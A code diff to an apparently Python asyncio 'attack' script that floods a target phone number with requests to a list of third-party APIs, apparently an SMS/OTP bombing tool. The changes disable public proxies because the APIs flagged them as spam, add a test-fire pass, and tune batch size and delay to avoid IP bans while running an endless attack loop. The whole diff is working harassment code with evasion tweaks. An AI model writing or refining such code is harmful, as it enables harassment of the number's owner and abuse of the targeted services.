@@ -43,7 +43,13 @@ def get_headers():
     }
 
 # 3. PROXY ENGINE
+# vROOT_CAUSE: Public Proxies are detected as spam by Indo APIs.
+# We switch to DIRECT connection (User's IP) which is much cleaner.
+USE_PROXY = False 
+
 async def get_proxies():
+    if not USE_PROXY: return []
+    
     print("⚡ [ULTRA] Fetching Fresh Proxies...")
     urls = [
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
@@ -71,17 +77,26 @@ async def attack(number):
     print("Press Ctrl+C to Stop")
     
     async with aiohttp.ClientSession() as session:
-        print("🔥 [ULTRA] ENGAGING TARGET...")
+        print("🔥 [ULTRA] ENGAGING TARGET (DIRECT MODE)...")
+        
+        # vDiagnostic: Test Fire once
+        print("🔎 Testing APIs...")
+        for api in APIS:
+             await fire(session, api, number, None)
+        print("🚀 MAIN ATTACK STARTED")
+        
         while True:
             tasks = []
-            # Batch of 50
-            for _ in range(50):
+            # Batch of 10 (Direct Mode needs lower concurrency to avoid instant IP ban)
+            for _ in range(10):
                 api = random.choice(APIS)
-                proxy = "http://" + random.choice(proxies) if proxies[0] else None
+                proxy = None
+                if proxies and proxies[0]:
+                    proxy = "http://" + random.choice(proxies)
                 tasks.append(fire(session, api, number, proxy))
             
             await asyncio.gather(*tasks)
-            await asyncio.sleep(0.5) # Slight breathing room
+            await asyncio.sleep(1.0) # Respectful delay for Direct Mode
 
 async def fire(session, api, number, proxy):
     try:
